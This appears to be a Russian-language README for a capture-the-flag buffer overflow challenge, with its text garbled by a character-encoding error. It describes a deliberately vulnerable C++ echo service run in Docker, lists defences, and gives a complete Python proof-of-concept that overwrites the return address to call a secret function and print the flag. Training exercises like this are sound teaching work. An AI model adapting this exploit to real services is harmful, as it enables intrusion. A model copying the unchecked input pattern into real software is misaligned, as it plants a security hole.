# üöÄ CTF Challenge: Buffer Overflow Exploit

## üìå –û–ø–∏—Å–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–î–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å —Å–æ–¥–µ—Ä–∂–∏—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å **Buffer Overflow (BOF)**, –ø–æ–∑–≤–æ–ª—è—é—â—É—é –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–æ–¥, –∏–∑–º–µ–Ω—è—è –∞–¥—Ä–µ—Å –≤–æ–∑–≤—Ä–∞—Ç–∞ —Ñ—É–Ω–∫—Ü–∏–∏. –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –∏–∑-–∑–∞ –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π –∑–∞–ø–∏—Å–∏ –¥–∞–Ω–Ω—ã—Ö –≤ –±—É—Ñ–µ—Ä —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω—ã–µ —É—á–∞—Å—Ç–∫–∏ –ø–∞–º—è—Ç–∏.

## üõ°Ô∏è –°–ø–æ—Å–æ–±—ã –∑–∞—â–∏—Ç—ã

–ß—Ç–æ–±—ã –∑–∞—â–∏—Ç–∏—Ç—å—Å—è –æ—Ç BOF-–∞—Ç–∞–∫, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã:

- **Stack Canaries** ‚Äî –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è, –ø–æ–º–µ—â–µ–Ω–Ω—ã–µ –≤ —Å—Ç–µ–∫ –ø–µ—Ä–µ–¥ –∞–¥—Ä–µ—Å–æ–º –≤–æ–∑–≤—Ä–∞—Ç–∞.
- **ASLR (Address Space Layout Randomization)** ‚Äî —Ä–∞–Ω–¥–æ–º–∏–∑–∞—Ü–∏—è —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏—è –ø–∞–º—è—Ç–∏, —á—Ç–æ –∑–∞—Ç—Ä—É–¥–Ω—è–µ—Ç –∞—Ç–∞–∫—É.
- **DEP/NX-bit (Data Execution Prevention)** ‚Äî –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –≤ –æ–±–ª–∞—Å—Ç—è—Ö –ø–∞–º—è—Ç–∏, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã—Ö —Ç–æ–ª—å–∫–æ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö.
- **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π** (`fgets()`, `strncpy()`, `snprintf()`) –≤–º–µ—Å—Ç–æ `gets()`, `strcpy()`, `sprintf()`.

## üõ† –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ –∑–∞–ø—É—Å–∫—É

### üìå –¢—Ä–µ–±–æ–≤–∞–Ω–∏—è

- **Docker**
- **Docker Compose**

### üöÄ –†–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ –≤ Docker

1. –ö–ª–æ–Ω–∏—Ä—É–π—Ç–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π:
    
    ```sh
    git clone https://github.com/your-repo/bof-ctf-challenge.git
    cd bof-ctf-challenge
    ```
    
2. –ó–∞–ø—É—Å—Ç–∏—Ç–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä:
    
    ```sh
    docker-compose up --build -d
    ```
    
3. –ü–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –∫ —Å–µ—Ä–≤–∏—Å—É —á–µ—Ä–µ–∑ `nc` (–≤ –Ω–æ–≤–æ–º —Ç–µ—Ä–º–∏–Ω–∞–ª–µ):
    
    ```sh
    nc localhost 1337
    ```
    

## üîç –û–ø–∏—Å–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –¥–∞–Ω–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏

### üìå –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç —ç–∫—Å–ø–ª–æ–π—Ç

1. –ü—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ —Å–µ—Ä–≤–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ –∏ –∞–¥—Ä–µ—Å —Å–µ–∫—Ä–µ—Ç–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ `secret_function()`.
    
2. –í –∫–æ–¥–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏—è `vulnerable_echo()`, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–π –≤–≤–æ–¥ —á–µ—Ä–µ–∑ `cin >> buffer`, –Ω–µ –ø—Ä–æ–≤–µ—Ä—è—è —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞.
    
3. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–ø–∏—Å–∞—Ç—å –≤ —Å—Ç–µ–∫ –±–æ–ª—å—à–µ –¥–∞–Ω–Ω—ã—Ö, —á–µ–º –≤—ã–¥–µ–ª–µ–Ω–æ –≤ –±—É—Ñ–µ—Ä–µ (128 –±–∞–π—Ç), —á—Ç–æ –≤–µ–¥–µ—Ç –∫ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –∞–¥—Ä–µ—Å–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞ —Ñ—É–Ω–∫—Ü–∏–∏.
    
4. –≠–∫—Å–ø–ª–æ–π—Ç —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç payload –∏–∑ 136 —Å–∏–º–≤–æ–ª–æ–≤ "A" (–¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ –∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –∞–¥—Ä–µ—Å–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞) –∏ –∞–¥—Ä–µ—Å–∞ —Å–µ–∫—Ä–µ—Ç–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.
    
5. –ü—Ä–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –∞–¥—Ä–µ—Å–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞ –Ω–∞ –∞–¥—Ä–µ—Å `secret_function()`, –ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é –∏ –≤—ã–¥–∞–µ—Ç —Ñ–ª–∞–≥.
    

**–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π —É—á–∞—Å—Ç–æ–∫ –∫–æ–¥–∞:**

```cpp
void vulnerable_echo() {
    char buffer[128];
    std::cout << "Enter your message: ";
    std::cin >> buffer;  // ‚ö†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å: –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–π –≤–≤–æ–¥!
    std::cout << "You entered: " << buffer << std::endl;
}
```

## üéØ POC-—ç–∫—Å–ø–ª–æ–∏—Ç

–°–æ–∑–¥–∞–π—Ç–µ —Ñ–∞–π–ª `exploit.py` –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –Ω–µ–≥–æ —Å–ª–µ–¥—É—é—â–∏–π –∫–æ–¥:

```python
#!/usr/bin/env python3
import socket  # –ú–æ–¥—É–ª—å –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å —Å–µ—Ç–µ–≤—ã–º–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è–º–∏
import sys     # –ú–æ–¥—É–ª—å –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫ –∏ –≤—ã—Ö–æ–¥–∞ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —É—è–∑–≤–∏–º–æ–º—É —Å–µ—Ä–≤–∏—Å—É
HOST = "localhost"  # –ê–¥—Ä–µ—Å —Å–µ—Ä–≤–µ—Ä–∞ (–ª–æ–∫–∞–ª—å–Ω—ã–π —Ö–æ—Å—Ç)
PORT = 1337         # –ü–æ—Ä—Ç, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º —Ä–∞–±–æ—Ç–∞–µ—Ç —É—è–∑–≤–∏–º—ã–π —Å–µ—Ä–≤–∏—Å

# –ê–¥—Ä–µ—Å —Å–µ–∫—Ä–µ—Ç–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ (–Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ –∞–∫—Ç—É–∞–ª—å–Ω—ã–π –ø–æ—Å–ª–µ –∞–Ω–∞–ª–∏–∑–∞ –±–∏–Ω–∞—Ä—è)
SECRET_ADDR = 0x4012b1  

# –°–º–µ—â–µ–Ω–∏–µ (–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç –¥–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –∞–¥—Ä–µ—Å–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞)
OFFSET = 136  

def main():
    """ –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –≤—ã–ø–æ–ª–Ω—è—é—â–∞—è –∞—Ç–∞–∫—É –Ω–∞ —É—è–∑–≤–∏–º—ã–π —Å–µ—Ä–≤–µ—Ä """

    # –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –±–∞–π—Ç–æ–≤—ã–π —Ñ–æ—Ä–º–∞—Ç (–º–ª–∞–¥—à–∏–µ –±–∞–π—Ç—ã –≤–ø–µ—Ä–µ–¥, little-endian)
    addr_bytes = SECRET_ADDR.to_bytes(8, byteorder='little')

    # –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É: 
    # - 136 —Å–∏–º–≤–æ–ª–æ–≤ "A" –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞
    # - –ê–¥—Ä–µ—Å —Å–µ–∫—Ä–µ—Ç–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ (–ø–µ—Ä–µ–∑–∞–ø–∏—Å—å –∞–¥—Ä–µ—Å–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞)
    # - –°–∏–º–≤–æ–ª –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏, –∏–º–∏—Ç–∏—Ä—É—é—â–∏–π –≤–≤–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    payload = b"A" * OFFSET + addr_bytes + b"\n"

    try:
        # –°–æ–∑–¥–∞–µ–º TCP-—Å–æ–∫–µ—Ç
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–∞—É—Ç –¥–ª—è —á—Ç–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
            s.settimeout(5)
            # –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —É—è–∑–≤–∏–º–æ–º—É —Å–µ—Ä–≤–∏—Å—É
            s.connect((HOST, PORT))
            
            # –°–Ω–∞—á–∞–ª–∞ —á–∏—Ç–∞–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞
            welcome = s.recv(4096)
            print(welcome.decode(errors="ignore"), end="")
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–π —ç–∫—Å–ø–ª–æ–π—Ç
            s.sendall(payload)
            
            # –ü–æ–ª—É—á–∞–µ–º –æ—Ç–≤–µ—Ç –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞ (—Ñ–ª–∞–≥) - —á–∏—Ç–∞–µ–º –≤—Å–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            response = b""
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break
            print(response.decode(errors="ignore"))  # –í—ã–≤–æ–¥–∏–º –æ—Ç–≤–µ—Ç (—Ñ–ª–∞–≥)

    except Exception as e:
        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –∏–ª–∏ –ø–µ—Ä–µ–¥–∞—á–∏ –¥–∞–Ω–Ω—ã—Ö
        print("Connection or data transfer error:", e)
        sys.exit(1)  # –ó–∞–≤–µ—Ä—à–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏

# –ó–∞–ø—É—Å–∫ –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –µ—Å–ª–∏ —Å–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é
if __name__ == "__main__":
    main()

```

### üí° –ó–∞–ø—É—Å–∫ —ç–∫—Å–ø–ª–æ–π—Ç–∞

–ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –ø—Ä–æ—Å—Ç–æ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ:

```sh
python exploit.py
```

## üéØ –ò—Ç–æ–≥

–í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–∏–ª–∏ —Ñ–ª–∞–≥! üéâ  

**–§–æ—Ä–º–∞—Ç —Ñ–ª–∞–≥–∞:**

```
practice{...}
```